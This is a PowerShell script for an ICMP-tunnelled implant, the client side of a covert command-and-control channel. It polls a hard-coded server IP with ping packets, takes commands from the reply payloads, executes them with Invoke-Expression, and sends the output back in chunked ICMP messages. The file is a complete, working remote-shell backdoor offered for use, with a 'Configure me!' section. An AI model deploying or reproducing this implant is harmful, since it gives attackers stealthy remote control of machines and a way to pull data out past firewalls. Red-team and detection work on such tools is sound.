Enum ImplantMessageType {
	Prompt = 1
	NeedsInstruction = 3
	CommandResultPart = 5
	CommandResultEnd = 7
	Stopping = 9
	Sync = 11
}

Enum ServerMessageType {
	NeedsPrompt = 0
	IssuingCommand = 2
	Stop = 4
	Received = 6
	Sync = 8
}

Enum ImplantState {
	WaitingForInstruction
	SendingCommandResult
}

# Configure me!
$ServerIPAddress = '192.168.86.95';
$BufferSize = 1469;
$PingTimeout = 1000;

$Ping = New-Object System.Net.NetworkInformation.Ping;
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
$PingOptions.DontFragment = $true;

Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
	$MessageBytes = @($MessageType) + $Data;
	$Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions);
	Return $Reply;
}

Function Get-Prompt([string]$Status = [char]0x270D + ' ') {
	# Customize your prompt!
	Return "$Status ($env:USERNAME@$env:USERDOMAIN) $((Get-Location).Path)> ";
}

[ImplantState]$State = [ImplantState]::WaitingForInstruction;
$CommandResult = "";
$CommandIndex = 0;

While ($True) {
	Switch ($State) {
		WaitingForInstruction {
			$Reply = Send-ICMPMessage -MessageType NeedsInstruction;
			If ($Reply.Buffer.Count -gt 0) {
				$ServerMessageType = [ServerMessageType]$Reply.Buffer[0];
				Write-Host "Server message:" $ServerMessageType;
				Switch ($ServerMessageType) {
					NeedsPrompt {
						$Prompt = Get-Prompt;
						$PromptBytes = [Text.Encoding]::UTF8.GetBytes($Prompt);
						Send-ICMPMessage -MessageType Prompt -Data $PromptBytes;
						$State = [ImplantState]::WaitingForInstruction;
						Write-Host "State:" $State;
						Break;
					}
					IssuingCommand {
						$Command = [Text.Encoding]::UTF8.GetString($Reply.Buffer[1..($Reply.Buffer.Count - 1)]);
						Try {
							$CommandResult = Invoke-Expression -Command $Command 2>&1 | Out-String;
						}
						Catch {
							$CommandResult = $_.Exception.Message;
						}
						$CommandIndex = 0;
						$State = [ImplantState]::SendingCommandResult;
						Write-Host "State:" $State;
						Break;
					}
					Stop {
						Return;
					}
				}
			}
		}
		SendingCommandResult {
			$CommandResultBytes = [Text.Encoding]::UTF8.GetBytes($CommandResult);
			$ChunkSize = [Math]::Min($BufferSize, $CommandResultBytes.Count - $CommandIndex);
			$Chunk = $CommandResultBytes[$CommandIndex..($CommandIndex + $ChunkSize - 1)];
			Send-ICMPMessage -MessageType CommandResultPart -Data $Chunk | Out-Null;
			$CommandIndex += $ChunkSize;
			If ($CommandIndex -ge $CommandResultBytes.Count) {
				Send-ICMPMessage -MessageType CommandResultEnd | Out-Null;
				$State = [ImplantState]::WaitingForInstruction;
				Write-Host "State:" $State;
			}
		}
	}
	Start-Sleep 1;
}
